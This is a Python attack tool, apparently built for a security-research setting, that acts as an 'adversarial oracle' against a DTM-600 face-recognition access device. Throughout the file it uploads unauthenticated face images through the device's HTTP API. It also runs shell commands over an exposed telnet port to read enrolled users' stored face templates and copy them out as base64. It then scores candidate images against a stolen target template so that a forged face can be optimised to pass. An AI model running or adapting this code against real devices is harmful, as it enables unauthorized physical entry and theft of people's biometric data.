#!/usr/bin/env python3
"""
Adversarial Oracle for DTM-600 Face Recognition Bypass
Provides query interface to the device for black-box adversarial attacks.

Components:
    - Upload face images via LAPI
    - Extract face templates via telnet
    - Compute cosine similarity to target template

Usage:
    from adversarial_oracle import AdversarialOracle
    oracle = AdversarialOracle("192.168.30.178", "user_target_template.bin")
    success, similarity, face_id = oracle.query(image_array)
"""

import base64
import json
import numpy as np
import socket
import struct
import time
import urllib.request
import urllib.error
from pathlib import Path
from typing import Optional, Tuple
import io

# Optional cv2 - will be needed for image encoding
try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False
    print("[!] cv2 not available - use encode_jpeg_pil() instead")

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False


class TemplateFormat:
    """DTM-600 face template format constants."""
    HEADER_SIZE = 20  # 0x14 bytes header
    EMBEDDING_DIM = 256  # 256 float32 values
    TOTAL_SIZE = HEADER_SIZE + EMBEDDING_DIM * 4  # 1044 bytes


class AdversarialOracle:
    """
    Black-box query oracle for DTM-600 face recognition.

    Queries the device by:
    1. Uploading an image via LAPI
    2. Extracting the generated template via telnet
    3. Computing cosine similarity to target embedding
    """

    def __init__(self, device_ip: str, target_template_path: str,
                 lib_id: int = 3, lapi_port: int = 80, telnet_port: int = 2323):
        """
        Initialize the oracle.

        Args:
            device_ip: IP address of DTM-600 device
            target_template_path: Path to user's target template (1044 bytes)
            lib_id: Face library ID to use (3=Employee, 4=Visitor)
            lapi_port: HTTP API port (default 80)
            telnet_port: Telnet shell port (default 2323)
        """
        self.device_ip = device_ip
        self.lib_id = lib_id
        self.lapi_url = f"http://{device_ip}:{lapi_port}"
        self.telnet_port = telnet_port

        # Load target template
        self.target_embedding = self._load_template(target_template_path)

        # Query tracking
        self.query_count = 0
        self.successful_queries = 0
        self.face_detection_failures = 0

        # Rate limiting
        self.min_query_interval = 0.5  # seconds
        self.last_query_time = 0

        # Person ID tracking for cleanup
        self.created_person_ids = []

    def _load_template(self, path: str) -> np.ndarray:
        """Load and validate a face template file."""
        data = Path(path).read_bytes()

        if len(data) != TemplateFormat.TOTAL_SIZE:
            raise ValueError(f"Invalid template size: {len(data)} bytes "
                           f"(expected {TemplateFormat.TOTAL_SIZE})")

        # Skip 20-byte header, extract 256 floats
        embedding_data = data[TemplateFormat.HEADER_SIZE:]
        embedding = np.frombuffer(embedding_data, dtype=np.float32)

        if len(embedding) != TemplateFormat.EMBEDDING_DIM:
            raise ValueError(f"Invalid embedding dimension: {len(embedding)}")

        # Normalize for cosine similarity
        norm = np.linalg.norm(embedding)
        if norm > 0:
            embedding = embedding / norm

        return embedding

    def _encode_jpeg(self, image_array: np.ndarray, quality: int = 95) -> bytes:
        """Encode numpy array as JPEG bytes."""
        if HAS_CV2:
            _, jpeg_data = cv2.imencode('.jpg', image_array,
                                        [cv2.IMWRITE_JPEG_QUALITY, quality])
            return jpeg_data.tobytes()
        elif HAS_PIL:
            # Convert BGR to RGB if needed
            if len(image_array.shape) == 3 and image_array.shape[2] == 3:
                image_array = image_array[:, :, ::-1]  # BGR to RGB
            img = Image.fromarray(image_array)
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=quality)
            return buffer.getvalue()
        else:
            raise RuntimeError("Neither cv2 nor PIL available for JPEG encoding")

    def _upload_image(self, jpeg_data: bytes, name: str = "adv_test") -> Optional[dict]:
        """
        Upload image via LAPI and return response with PersonID/FaceID.

        Returns:
            dict with 'person_id' and 'face_id' on success, None on failure
        """
        b64_image = base64.b64encode(jpeg_data).decode('ascii')

        timestamp = int(time.time() * 1000)
        payload = {
            "PersonInfo": {
                "PersonName": f"{name}_{timestamp}",
                "Gender": 1,
                "ImageList": [{
                    "FaceType": 1,
                    "ImageData": b64_image
                }]
            }
        }

        json_data = json.dumps(payload).encode('utf-8')
        url = f"{self.lapi_url}/LAPI/V1.0/PeopleLibraries/{self.lib_id}/People"

        req = urllib.request.Request(
            url,
            data=json_data,
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
            method='POST'
        )

        try:
            response = urllib.request.urlopen(req, timeout=30)
            resp_data = json.loads(response.read().decode('utf-8'))

            # Parse response for PersonID and FaceID
            # Response format: {"Response": {"ResponseURL": "...", "Data": {...}}}
            if 'Response' in resp_data:
                data = resp_data.get('Response', {}).get('Data', {})
                # Try to extract from URL or Data
                resp_url = resp_data.get('Response', {}).get('ResponseURL', '')
                # URL format: /LAPI/V1.0/PeopleLibraries/3/People/PersonID
                if '/People/' in resp_url:
                    person_id = resp_url.split('/People/')[-1].split('/')[0]
                    return {'person_id': person_id, 'response': resp_data}

            # Fallback: try to find PersonID in response
            if 'PersonID' in str(resp_data):
                # Search recursively
                return {'person_id': self._find_person_id(resp_data), 'response': resp_data}

            return {'response': resp_data}

        except urllib.error.HTTPError as e:
            error_body = e.read().decode('utf-8', errors='ignore')
            # Check for face detection failure codes
            if '0x10000006' in error_body or 'No face detected' in error_body.lower():
                return None  # Face detection failed
            print(f"[!] HTTP Error {e.code}: {error_body[:200]}")
            return None
        except Exception as e:
            print(f"[!] Upload error: {e}")
            return None

    def _find_person_id(self, obj, depth=0):
        """Recursively search for PersonID in response object."""
        if depth > 10:
            return None
        if isinstance(obj, dict):
            if 'PersonID' in obj:
                return obj['PersonID']
            for v in obj.values():
                result = self._find_person_id(v, depth + 1)
                if result:
                    return result
        elif isinstance(obj, list):
            for item in obj:
                result = self._find_person_id(item, depth + 1)
                if result:
                    return result
        return None

    def _telnet_command(self, command: str, timeout: float = 5.0) -> str:
        """Execute command via telnet and return output."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((self.device_ip, self.telnet_port))

            # Wait for prompt
            time.sleep(0.3)
            sock.recv(4096)  # Discard banner

            # Send command
            sock.send(f"{command}\n".encode())
            time.sleep(0.5)

            # Receive response
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 100000:  # Safety limit
                        break
                except socket.timeout:
                    break

            sock.close()
            return response.decode('utf-8', errors='ignore')

        except Exception as e:
            print(f"[!] Telnet error: {e}")
            return ""

    def _extract_template(self, person_id: str) -> Optional[np.ndarray]:
        """Extract face template from device via telnet."""
        # Find template file path
        # Pattern: /data/WorkLibFile/{lib_id}/PersonID_{range}/FaceID_{id}.bin

        # First, find the file
        find_cmd = f"find /data/WorkLibFile/{self.lib_id} -name 'FaceID_*{person_id}*.bin' 2>/dev/null | head -1"
        result = self._telnet_command(find_cmd)

        # Parse file path from output
        lines = [l.strip() for l in result.split('\n') if '.bin' in l and 'FaceID' in l]
        if not lines:
            # Try alternate search pattern
            find_cmd = f"ls /data/WorkLibFile/{self.lib_id}/PersonID_*/FaceID_*.bin 2>/dev/null | tail -1"
            result = self._telnet_command(find_cmd)
            lines = [l.strip() for l in result.split('\n') if '.bin' in l and 'FaceID' in l]

        if not lines:
            print(f"[!] Could not find template file for person {person_id}")
            return None

        template_path = lines[0]

        # Extract template via base64
        b64_cmd = f"base64 {template_path}"
        b64_output = self._telnet_command(b64_cmd, timeout=10)

        # Parse base64 data (remove command echo and prompt)
        b64_lines = []
        in_data = False
        for line in b64_output.split('\n'):
            line = line.strip()
            if not line:
                continue
            # Skip command echo and prompts
            if 'base64' in line or line.startswith('#') or line.startswith('/'):
                in_data = True
                continue
            if in_data and line and not line.startswith('~'):
                b64_lines.append(line)

        b64_data = ''.join(b64_lines)

        try:
            template_data = base64.b64decode(b64_data)
        except Exception as e:
            print(f"[!] Base64 decode error: {e}")
            return None

        if len(template_data) != TemplateFormat.TOTAL_SIZE:
            print(f"[!] Invalid template size: {len(template_data)}")
            return None

        # Extract embedding
        embedding_data = template_data[TemplateFormat.HEADER_SIZE:]
        embedding = np.frombuffer(embedding_data, dtype=np.float32).copy()

        return embedding

    def _delete_person(self, person_id: str) -> bool:
        """Delete person entry to clean up."""
        url = f"{self.lapi_url}/LAPI/V1.0/PeopleLibraries/{self.lib_id}/People/{person_id}"

        req = urllib.request.Request(url, method='DELETE')

        try:
            urllib.request.urlopen(req, timeout=10)
            return True
        except:
            return False

    def _compute_similarity(self, embedding: np.ndarray) -> float:
        """Compute cosine similarity between embedding and target."""
        # Normalize embedding
        norm = np.linalg.norm(embedding)
        if norm == 0:
            return 0.0
        embedding_norm = embedding / norm

        # Cosine similarity
        similarity = np.dot(embedding_norm, self.target_embedding)

        # Clamp to valid range
        return float(np.clip(similarity, -1.0, 1.0))

    def query(self, image_array: np.ndarray,
              cleanup: bool = True) -> Tuple[bool, float, Optional[str]]:
        """
        Query the device with an image.

        Args:
            image_array: Image as numpy array (BGR format if color)
            cleanup: Whether to delete the entry after extraction

        Returns:
            Tuple of (success, similarity, person_id)
            - success: True if face was detected and template extracted
            - similarity: Cosine similarity to target (0.0-1.0), -1 on failure
            - person_id: Assigned person ID, None on failure
        """
        # Rate limiting
        elapsed = time.time() - self.last_query_time
        if elapsed < self.min_query_interval:
            time.sleep(self.min_query_interval - elapsed)

        self.query_count += 1
        self.last_query_time = time.time()

        # Step 1: Encode image
        try:
            jpeg_data = self._encode_jpeg(image_array)
        except Exception as e:
            print(f"[!] Image encoding error: {e}")
            return (False, -1.0, None)

        # Step 2: Upload to device
        result = self._upload_image(jpeg_data)
        if result is None:
            self.face_detection_failures += 1
            return (False, -1.0, None)

        person_id = result.get('person_id')
        if not person_id:
            print("[!] Could not extract PersonID from response")
            return (False, -1.0, None)

        self.created_person_ids.append(person_id)

        # Brief delay for template to be written
        time.sleep(0.3)

        # Step 3: Extract template
        embedding = self._extract_template(person_id)
        if embedding is None:
            if cleanup:
                self._delete_person(person_id)
            return (False, -1.0, person_id)

        # Step 4: Compute similarity
        similarity = self._compute_similarity(embedding)
        self.successful_queries += 1

        # Step 5: Cleanup
        if cleanup:
            self._delete_person(person_id)

        return (True, similarity, person_id)

    def query_raw_jpeg(self, jpeg_data: bytes,
                       cleanup: bool = True) -> Tuple[bool, float, Optional[str]]:
        """Query with raw JPEG bytes instead of numpy array."""
        # Rate limiting
        elapsed = time.time() - self.last_query_time
        if elapsed < self.min_query_interval:
            time.sleep(self.min_query_interval - elapsed)

        self.query_count += 1
        self.last_query_time = time.time()

        # Upload
        result = self._upload_image(jpeg_data)
        if result is None:
            self.face_detection_failures += 1
            return (False, -1.0, None)

        person_id = result.get('person_id')
        if not person_id:
            return (False, -1.0, None)

        self.created_person_ids.append(person_id)
        time.sleep(0.3)

        # Extract template
        embedding = self._extract_template(person_id)
        if embedding is None:
            if cleanup:
                self._delete_person(person_id)
            return (False, -1.0, person_id)

        # Compute similarity
        similarity = self._compute_similarity(embedding)
        self.successful_queries += 1

        if cleanup:
            self._delete_person(person_id)

        return (True, similarity, person_id)

    def get_stats(self) -> dict:
        """Return query statistics."""
        return {
            'total_queries': self.query_count,
            'successful_queries': self.successful_queries,
            'face_detection_failures': self.face_detection_failures,
            'success_rate': self.successful_queries / max(1, self.query_count)
        }

    def check_device_alive(self) -> bool:
        """Check if device is responding."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.device_ip, self.telnet_port))
            sock.close()
            return result == 0
        except:
            return False

    def cleanup_all(self):
        """Delete all persons created during this session."""
        print(f"[*] Cleaning up {len(self.created_person_ids)} entries...")
        for pid in self.created_person_ids:
            self._delete_person(pid)
        self.created_person_ids = []


def extract_target_template(device_ip: str, face_id: str, lib_id: int = 4,
                           output_path: str = "user_target_template.bin") -> bool:
    """
    Helper function to extract user's template from device.

    Args:
        device_ip: Device IP
        face_id: The FaceID to extract (e.g., "4026974185")
        lib_id: Library ID (usually 4 for visitor lib)
        output_path: Where to save the template
    """
    print(f"[*] Extracting template FaceID_{face_id} from lib {lib_id}")

    # Find the template file
    find_cmd = f"find /data/WorkLibFile/{lib_id} -name 'FaceID_{face_id}.bin' 2>/dev/null"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((device_ip, 2323))
    time.sleep(0.3)
    sock.recv(4096)

    sock.send(f"{find_cmd}\n".encode())
    time.sleep(1)
    result = sock.recv(4096).decode()

    # Parse path
    lines = [l.strip() for l in result.split('\n') if '.bin' in l]
    if not lines:
        print("[!] Template file not found")
        sock.close()
        return False

    template_path = lines[0]
    print(f"[+] Found: {template_path}")

    # Extract via base64
    sock.send(f"base64 {template_path}\n".encode())
    time.sleep(2)

    b64_output = b""
    while True:
        try:
            chunk = sock.recv(8192)
            if not chunk:
                break
            b64_output += chunk
        except socket.timeout:
            break

    sock.close()

    # Parse base64
    b64_text = b64_output.decode('utf-8', errors='ignore')
    b64_lines = []
    for line in b64_text.split('\n'):
        line = line.strip()
        if not line or 'base64' in line or line.startswith('#') or line.startswith('/'):
            continue
        if line and not line.startswith('~'):
            b64_lines.append(line)

    b64_data = ''.join(b64_lines)

    try:
        template_data = base64.b64decode(b64_data)
    except Exception as e:
        print(f"[!] Base64 decode failed: {e}")
        return False

    if len(template_data) != TemplateFormat.TOTAL_SIZE:
        print(f"[!] Wrong size: {len(template_data)} (expected {TemplateFormat.TOTAL_SIZE})")
        return False

    Path(output_path).write_bytes(template_data)
    print(f"[+] Saved template to {output_path} ({len(template_data)} bytes)")

    return True


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="DTM-600 Adversarial Oracle")
    parser.add_argument("--target", default="192.168.30.178", help="Device IP")
    parser.add_argument("--extract-template", metavar="FACE_ID",
                       help="Extract template for given FaceID")
    parser.add_argument("--lib", type=int, default=4, help="Library ID")
    parser.add_argument("--output", default="user_target_template.bin",
                       help="Output file for template extraction")
    parser.add_argument("--test", metavar="IMAGE", help="Test oracle with image file")
    parser.add_argument("--template", default="user_target_template.bin",
                       help="Target template for similarity comparison")

    args = parser.parse_args()

    if args.extract_template:
        extract_target_template(args.target, args.extract_template,
                               args.lib, args.output)

    elif args.test:
        if not Path(args.template).exists():
            print(f"[!] Template file not found: {args.template}")
            exit(1)

        oracle = AdversarialOracle(args.target, args.template, lib_id=args.lib)

        if not oracle.check_device_alive():
            print(f"[!] Device not responding at {args.target}")
            exit(1)

        print(f"[*] Testing oracle with {args.test}")

        if HAS_CV2:
            img = cv2.imread(args.test)
        elif HAS_PIL:
            img = np.array(Image.open(args.test))
        else:
            print("[!] No image library available")
            exit(1)

        success, sim, pid = oracle.query(img)

        print(f"\nResult:")
        print(f"  Success: {success}")
        print(f"  Similarity: {sim:.4f} ({sim*100:.2f}%)")
        print(f"  PersonID: {pid}")
        print(f"\nStats: {oracle.get_stats()}")

    else:
        parser.print_help()
